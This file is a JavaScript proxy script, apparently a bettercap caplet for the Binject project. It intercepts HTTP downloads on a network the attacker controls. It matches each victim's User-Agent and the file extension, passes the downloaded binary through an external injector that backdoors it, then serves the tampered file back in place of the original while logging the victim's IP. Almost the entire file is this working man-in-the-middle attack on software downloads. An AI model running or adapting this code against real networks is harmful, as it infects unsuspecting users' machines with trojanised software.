var targets = {}

var nullbyte = "\u0000"

var green   = "\033[32m",
    boldRed = "\033[1;31m",
    onRed   = "\033[41m",
    reset   = "\033[0m",
    redLine = "\n  " + onRed + " " + reset

function onLoad() {
	devices = env["binject.devices"].split(",")
	logStr = ""
	for (var i = 0; i < devices.length; i++) {
		item = {
			"device": devices[i],
			"useragent": env[ "binject.useragent." + devices[i] ],
			"extensions": env[ "binject.extensions." + devices[i] ].toLowerCase().split(",")
		}
		targets[i] = item
		logStr += "\n  " + green + targets[i]["device"] + reset +
		          "\n    User-Agent: " + targets[i]["useragent"] + 
		          "\n    Extensions: " + targets[i]["extensions"] + "\n"
	}
	log("Binject loaded.\n\nDownload Binject targets: \n" + logStr)
}

function onResponse(req, res) {
	// First of all check whether the requested path might have an extension (to save cpu)
	var requestedFileName = req.Path.replace(/.*\//g, "")
	if ( requestedFileName.indexOf(".") != -1 ) {
		var userAgent = req.GetHeader("User-Agent", ""),
		    extension
		// Iterate through targets
		for ( var t = 0; t < Object.keys(targets).length; t++ ) {
			// Check if User-Agent is a target
			regex = new RegExp(targets[t]["useragent"])
			if ( userAgent.match(regex) ) {
				// Iterate through target extensions
				for (var e = 0; e < targets[t]["extensions"].length; e++) {
					// Check if requested path contains a targeted extension
					// function endsWith() could be a nice simplification here
					if ( requestedFileName.replace(/.*\./g, "").toLowerCase() == targets[t]["extensions"][e] ) {
						extension = targets[t]["extensions"][e]
						// Binject
						logStr = "\n" + redLine + "  Binjecting download request from " + boldRed + req.Client.IP + reset + 
						         redLine + 
						         redLine + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset + 
						         redLine + 
						         redLine + "  Grabbing " + boldRed + targets[t]["device"].toUpperCase() + reset + " payload..."
					
		// ** Get http request and parse it, pipe to drypipe.
		var body = res.ReadBody()
		writeFile("/tmp/download.test",body)
		log(body)
		writeFile("/home/sblip/go/src/github.com/Binject/binjection/cmd/pipeinjector/testdry",body)
		// ** Read the output from from wetpipe.
		payload = readFile("/home/sblip/go/src/github.com/Binject/binjection/cmd/pipeinjector/testwet")

						// Check our payload size
						payloadSize = payload.length
						logStr += redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes"

						// Set Content-Disposition header to enforce file download instead of in-browser preview
						res.SetHeader("Content-Disposition", "attachment; filename=\"" + requestedFileName + "\"")
						// Update Content-Length header
						res.SetHeader("Content-Length", payload.length)
						logStr += redLine + 
						          redLine + "  Serving your payload to " + boldRed + req.Client.IP + reset + "...\n"
						log(logStr)
						// this ?
						res.Body = payload
					}
				}
			}
		}
	}
}

